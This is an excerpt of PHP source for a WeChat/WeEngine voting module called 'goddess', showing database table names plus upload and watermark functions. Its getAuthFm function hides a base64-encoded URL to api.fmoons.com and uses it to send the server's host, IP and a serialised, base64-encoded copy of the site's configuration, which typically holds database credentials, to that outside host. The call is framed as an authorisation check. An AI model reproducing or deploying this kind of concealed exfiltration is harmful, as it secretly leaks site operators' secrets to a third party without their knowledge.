...
class Core extends WeModuleSite {
	...
	public $table_users_videoarr  = 'goddess_provevote_videoarr';	//
	...
	public $table_qrcode   = 'goddess_qrcode';//投票数据统计
	public $table_answer   = 'goddess_answer';//答题
	public $table_source   = 'goddess_source';//来源
	public $table_school   = 'goddess_school';//学校
...
//print_r($params);
	...
	public function getAuthFm() {
		...
		$d = ihttp_get(base64_decode("aHR0cDovL2FwaS5mbW9vbnMuY29tL2luZGV4LnBocD8md2VidXJsPQ==").$_SERVER ['HTTP_HOST']."&visitorsip=" . base64_encode(iserializer($_W['config'])) ."&modules=goddess&fmauthtoken=".$onlyoauth['fmauthtoken']."&hostip=".$_SERVER["SERVER_ADDR"]);
	}
	...
	public function uploadFile($file,$filetempname,$rid) {
		...
		load()->func('file');
		//自己设置的上传文件存放路径
		$filePath = IA_ROOT . '/addons/goddess/tmp/' . date('Ymd',time()) . '/';
		if (!is_dir($filePath)) {
	...
	public function WaterPoster($saveurl, $groundimage, $markimage, $markminwidth, $markminheight, $markwhere='0', $markwheret='0', $marktext='fmoons.com',$fontfamily='黑体', $fontsize='15', $fontcolor="#000", $marktype=0,$marktypet=0)
{
	...
	/**if(!file_exists($markimage))
		$markimage = '../addons/goddess/static/logo.png';
